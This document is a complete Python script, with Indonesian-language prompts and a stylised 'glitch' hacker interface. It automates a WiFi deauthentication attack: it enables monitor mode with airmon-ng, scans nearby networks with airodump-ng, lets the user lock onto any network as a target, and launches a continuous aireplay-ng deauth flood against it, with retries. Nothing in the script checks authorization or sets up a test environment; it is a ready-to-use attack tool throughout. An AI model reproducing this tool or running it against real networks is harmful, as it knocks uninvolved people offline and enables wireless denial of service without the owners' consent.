#!/usr/bin/env python3
import csv
import glob
import os
import random
import re
import subprocess
import sys
import tempfile
import time

GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RESET = "\033[0m"
BOLD = "\033[1m"

GLITCH_CHARS = "!@#$%^&*<>/\\|~?01"
GLITCH_COLORS = [GREEN, RED, CYAN, MAGENTA, YELLOW]


def clear_screen():
    os.system("clear")


def glitch_text(text):
    return f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"


def glitch_print(text, delay=0.02, rounds=8):
    """Efek glitch progresif untuk tampilan terminal."""
    n = len(text)
    settled = [False] * n

    for r in range(rounds):
        settle_ratio = (r + 1) / rounds
        line = ""
        for i, c in enumerate(text):
            if c == " ":
                line += " "
                continue

            if settled[i]:
                line += f"{GREEN}{c}{RESET}"
                continue

            if random.random() < settle_ratio * 0.5:
                settled[i] = True
                line += f"{GREEN}{c}{RESET}"
            else:
                glitch_char = random.choice(GLITCH_CHARS)
                color = random.choice(GLITCH_COLORS)
                line += f"{color}{glitch_char}{RESET}"

        sys.stdout.write("\r" + line + "\033[K")
        sys.stdout.flush()
        time.sleep(delay)

    for _ in range(2):
        flash = f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
        sys.stdout.write("\r" + flash + "\033[K")
        sys.stdout.flush()
        time.sleep(0.05)

    sys.stdout.write("\r" + f"{GREEN}{text}{RESET}" + "\033[K" + "\n")
    sys.stdout.flush()


def get_wireless_interfaces():
    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
    interfaces = []
    for line in output.splitlines():
        m = re.match(r"^\d+:\s+(\S+):", line)
        if m:
            name = m.group(1)
            if name == "lo":
                continue
            interfaces.append(name)
    return interfaces


def get_monitor_interface_name(adapter, output):
    current_ifaces = get_wireless_interfaces()
    for iface in current_ifaces:
        if iface != adapter and iface.endswith("mon"):
            return iface

    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
    if match:
        return match.group(1)

    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            m = re.search(r"\bInterface\s+(\S+)", line)
            if m:
                iface = m.group(1)
                if iface != adapter and iface.endswith("mon"):
                    return iface
    except FileNotFoundError:
        pass

    return f"{adapter}mon"


def run_command(cmd, description=None, show_output=True):
    if description:
        print(f"\n{CYAN}>{description}{RESET}")

    if show_output:
        print(" ".join(cmd))

    result = subprocess.run(cmd, capture_output=True, text=True)
    if show_output:
        if result.stdout:
            print(result.stdout.strip())
        if result.stderr:
            print(result.stderr.strip())

    if result.returncode != 0:
        if description or show_output:
            print(f"{YELLOW}Perintah gagal: {' '.join(cmd)}{RESET}")
        return None
    return result


def start_monitor_mode(adapter):
    glitch_print(f"ACTIVATING MONITOR MODE ON {adapter}...")
    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
    print("")
    if result is None:
        return adapter

    output = (result.stdout or "") + (result.stderr or "")
    monitor_iface = get_monitor_interface_name(adapter, output)
    time.sleep(1)
    print(glitch_text(f"> Interface monitor aktif: {monitor_iface}"))
    print()
    return monitor_iface


def scan_networks(adapter, duration=10):
    # Membersihkan layar terminal sebelum proses scan dimulai sesuai permintaan
    clear_screen()
    glitch_print("SCANNING WIFI NETWORKS...")
    
    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
    prefix = os.path.join(temp_dir, "scan")
    proc = subprocess.Popen(
        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        time.sleep(duration)
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

    networks = []
    seen = set()
    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                channel = row[3].strip()
                essid = row[13].strip()
                if not bssid or bssid.lower() == "bssid" or not essid:
                    continue
                key = (bssid, channel, essid)
                if key in seen:
                    continue
                seen.add(key)
                networks.append({"bssid": bssid, "channel": channel, "essid": essid})

    for path in glob.glob(prefix + "-*.csv"):
        try:
            os.remove(path)
        except OSError:
            pass
    try:
        os.rmdir(temp_dir)
    except OSError:
        pass

    return networks


def stop_monitor_mode(monitor_iface):
    # Membersihkan terminal sebelum mencetak log pemberhentian monitor mode
    clear_screen()
    glitch_print("STOPPING MONITOR MODE...")
    
    candidates = [monitor_iface]
    if monitor_iface.endswith("mon"):
        candidates.append(monitor_iface[:-3])
    else:
        candidates.append(f"{monitor_iface}mon")

    for name in candidates:
        result = run_command(["sudo", "airmon-ng", "stop", name], "MEMATIKAN MONITOR MODE", show_output=False)
        if result is not None:
            break

    run_command(["sudo", "systemctl", "restart", "NetworkManager"], "RESTART NETWORKMANAGER", show_output=False)


def set_monitor_channel(monitor_iface, channel):
    if not channel:
        return

    run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], None, show_output=False)


def run_deauth_attack(target, monitor_iface, retries=3, retry_delay=3):
    for attempt in range(1, retries + 1):
        set_monitor_channel(monitor_iface, target.get("channel"))
        cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
        print(f"\n{CYAN}▶ Menjalankan serangan deauth{RESET}")
        print(f"{YELLOW}{' '.join(cmd)}{RESET}")

        result = run_command(cmd, None, show_output=False)
        if result is not None:
            return

        if attempt < retries:
            time.sleep(retry_delay)

    print(f"{RED}Serangan deauth gagal setelah {retries} percobaan.{RESET}")


def prompt_keyboard_interrupt_action():
    print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
    print(f"{GREEN}1.{RESET} Pilih target lagi")
    print(f"{GREEN}2.{RESET} Kembali ke menu")
    print(f"{GREEN}3.{RESET} Keluar")

    while True:
        choice = input("\nPilih opsi [1-3]: ").strip()
        if choice == "1":
            return "restart"
        if choice == "2":
            return "menu"
        if choice == "3":
            return "exit"
        print("Input salah, pilih 1, 2, atau 3.")


def back_to_menu():
    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
    if not os.path.exists(menu_path):
        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
    os.execvp(sys.executable, [sys.executable, menu_path])


def select_interface():
    glitch_print("SCANNING INTERFACES...")
    ifaces = get_wireless_interfaces()
    if not ifaces:
        print("Ga ada interface ditemukan.")
        sys.exit(1)

    print(f"\n{BOLD}Pilih interface:{RESET}")
    for idx, name in enumerate(ifaces, start=1):
        print(f"{GREEN}{idx}.{RESET} {name}")

    while True:
        choice = input("\nNomor: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            selected = ifaces[int(choice) - 1]
            glitch_print(f"LOCKED: {selected}")
            clear_screen()
            return selected
        print("Input salah, coba lagi.")


def select_target(networks):
    if not networks:
        print("Ga ada jaringan yang ketemu.")
        return None

    print(f"\n{BOLD}Pilih target WiFi:{RESET}")
    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
    print(header)
    print("-" * len(header))
    for idx, net in enumerate(networks, start=1):
        essid = net["essid"][:20]
        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")

    while True:
        choice = input("\nNomor target: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(networks):
            selected = networks[int(choice) - 1]
            glitch_print(f"TARGET LOCKED: {selected['essid']}")
            return selected
        print("Input salah, coba lagi.")


def main():
    adapter = None
    monitor_iface = None

    while True:
        try:
            if monitor_iface is None:
                adapter = select_interface()
                monitor_iface = start_monitor_mode(adapter)

            os.system("clear")
            print(f"{CYAN}{BOLD}[?]{RESET} Mau scan WiFi berapa detik brody?")
            scan_input = input(f"{YELLOW}>> detik (default 10): {RESET}").strip()
            
            if scan_input.isdigit() and int(scan_input) > 0:
                scan_duration = int(scan_input)
            else:
                scan_duration = 10  # Fallback kalau input kosong atau tidak valid

            networks = scan_networks(monitor_iface, duration=scan_duration)
            target = select_target(networks)

            if target is None:
                print("\nTidak ada target terpilih, kembali ke awal.")
                continue

            print(f"\n{CYAN}Target terpilih:{RESET} {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")

            run_deauth_attack(target, monitor_iface)
            print("\nMembersihkan sesi...")
            stop_monitor_mode(monitor_iface)
            break

        except KeyboardInterrupt:
            action = prompt_keyboard_interrupt_action()
            if action == "restart":
                print("\nMengulang ke pemilihan target...")
                continue
            if action == "menu":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                back_to_menu()
            if action == "exit":
                if monitor_iface:
                    stop_monitor_mode(monitor_iface)
                sys.exit(0)


if __name__ == "__main__":
    main()